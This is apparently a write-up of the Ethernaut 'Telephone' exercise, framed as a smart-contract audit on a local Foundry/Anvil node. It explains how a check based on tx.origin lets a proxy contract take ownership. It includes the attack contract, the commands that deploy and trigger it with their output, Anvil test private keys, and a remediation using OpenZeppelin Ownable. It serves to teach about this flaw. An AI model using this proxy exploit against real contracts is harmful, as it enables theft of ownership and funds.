## Smart Contract Security Audit: Level 04 - Telephone

Executive Summary
The target contract `Telephone` was audited to assess its access control mechanisms. A critical authorization flaw was identified in the ownership modification function due to an incorrect reliance on global execution parameters (`tx.origin`). This flaw allowed an external contract proxy to bypass security restrictions and successfully claim administrative control over the active level instance.

---

## Environment Deployment & Baseline Analysis

### Infrastructure Setup Commands
To perform this audit, the environment was initialized locally on an Anvil Ethereum node using Foundry. The master target contract was compiled and broadcasted using the system deployer key:

# Command: Deploy the target Telephone contract
cd contracts && /root/.foundry/bin/forge create src/levels/Telephone.sol:Telephone --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast && cd ..

Deployment Terminal Output Result

[⠊] Compiling...
No files changed, compilation skipped
Deployer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Deployed to: 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e
Transaction hash: 0xc3c409e2f16a045c1880b74112ddc8bdca48e1c92887368a8ab4ca116724fdea

Initial State Verification Query

Before initiating the exploit vector, a state call was executed directly to verify the starting administrative account:

# Command: Query the active owner string
cast call 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e "owner()(address)" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

Terminal Output Returned:

0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

Definition of Result: This address matches Anvil Account #0 (the deployer infrastructure wallet). This confirmed that the level was completely untouched and the owner state was pointing to the default system administrator.

## Vulnerability Analysis

The Phishing Code Defect

- The target contract implements an explicit state change modifier within the changeOwner function:

- Solidity

function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}

## Deep-Dive Definition of EVM Identity Metrics

The vulnerability stems from a fundamental misunderstanding of the execution variables provided by the Ethereum Virtual Machine:

  - msg.sender (Direct Call Signature): Points directly to the immediate account address or smart contract address that initiated the current execution step. If a wallet calls Contract A, msg.sender is the wallet. If Contract A calls Contract B, inside Contract B, msg.sender is Contract A.

 - tx.origin (Top-Level Cryptographic Origin): Points exclusively to the original External Owner Account (EOA) that signed the initial transaction hash with their private key. No matter how many recursive cross-contract execution hops occur across the network, tx.origin remains fixed as the signing player.

## The Structural Flaw Breakdown

The target developer assumed that checking tx.origin != msg.sender would protect the architecture. However, this implementation creates a classic phishing attack path:

   - If a standard player wallet interacts with the target contract directly, tx.origin (the user's wallet) is identical to msg.sender (the user's wallet). The check evaluates to false and access is denied.

   - If an attacker tricks a user or runs an intermediate Exploit Proxy Contract, the proxy relays the call. Inside the target, msg.sender becomes the Proxy Contract Address, but tx.origin remains the Player's Wallet Address. Because they are structurally different, the conditional check passes automatically.

## Exploitation Proof of Concept (PoC)
Exploit Proxy Implementation (TelephoneAttack.sol)

  - An intermediate proxy structure was compiled to act as the calling pivot vector, effectively separating the global execution context variables:
Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Telephone.sol";

contract TelephoneAttack {
    function attack(address _victim, address _owner) public {
        Telephone telephone = Telephone(_victim);
        telephone.changeOwner(_owner);
    }
}

## Exploit Infrastructure Deployment Command

# Command: Compile and deploy the malicious proxy interface
cd contracts && /root/.foundry/bin/forge create src/attacks/TelephoneAttack.sol:TelephoneAttack --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast && cd ..

## Exploit Deployment Terminal Output Result

[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.35
[⠢] Solc 0.8.35 finished in 12.42ms
Compiler run successful!
Deployer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Deployed to: 0xA51c1fc2f0D1a1b8494Ed1FE312d7C3a78Ed91C0
Transaction hash: 0xefab6c104504aa51a536fc9b4126b232a02eb3721a008fba7afdcba5703be4c5

## Triggering the Attack Vector

 - The attack function was fired using the Player's private key (0x59c6...), passing the victim instance address and assigning the Player's destination address as the target owner parameter:
Bash

## Command: Execute the intermediate exploit link
 - cast send 0xA51c1fc2f0D1a1b8494Ed1FE312d7C3a78Ed91C0 "attack(address,address)" 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

## Transaction Receipt Output Result

blockHash            0xf1a025b1bcc0cb1a0ffcff185c60027c5e23c621fd6c99e0547cb4d5f86660d3
blockNumber          29
cumulativeGasUsed    30327
effectiveGasPrice    24443161
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
gasUsed              30327
status               1 (success)
transactionHash      0x72641fdf8cb01ff2469d2f9ed4e3ccfc630b4d16ad95069cfce15c32032e47b5
to                   0xA51c1fc2f0D1a1b8494Ed1FE312d7C3a78Ed91C0

## Definition of Transaction Fields:

    - from: The player wallet address that initialized and paid for gas (0x7099...).

   - to: Points to the attack contract proxy (0xA51c...).

   -  status: 1 (success): Confirms the transaction executed completely without reverting, verifying that the target contract validated the incoming payload and successfully committed the data update to its storage slot.

## Final Verification Call

Command: Re-audit the owner parameter
cast call 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e "owner()(address)" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

## Final Terminal Output:

0x70997970C51812dc3A010C7d01b50e0d17dc79C8

Definition of Final State: The storage output successfully returned the Player's public address string. Ownership was cleanly hijacked from the original deployer framework.

## Lessons Learned & Remediation
# Key Security Takeaways

   - tx.origin is inherently dangerous for authorization validation. Its utility should be tightly constrained to preventing smart contract interactions entirely (e.g., verifying tx.origin == msg.sender ensures that the caller is an EOA and not a smart contract), though even this pattern has nuance with modern account abstraction (ERC-4337).

  -  Phishing contract structures can act as transparent intermediate call routers, easily spoofing authorization layers that fail to evaluate direct messaging layers.

# Remediation Guidance

   - Enforce msg.sender for Access Control: Remove all comparisons evaluating tx.origin. All identity-based security checks must prioritize the direct caller context.

  -  Standardize on Proven Frameworks: Replace open validation scripts with standard, hardened role frameworks such as OpenZeppelin's Ownable or AccessControl.
    Solidity

    // Remediated Production Code Pattern
    import "@openzeppelin/contracts/access/Ownable.sol";

    contract RemediatedTelephone is Ownable {
        constructor() Ownable(msg.sender) {}

        function changeOwner(address _newOwner) public onlyOwner {
            transferOwnership(_newOwner);
        }
    }
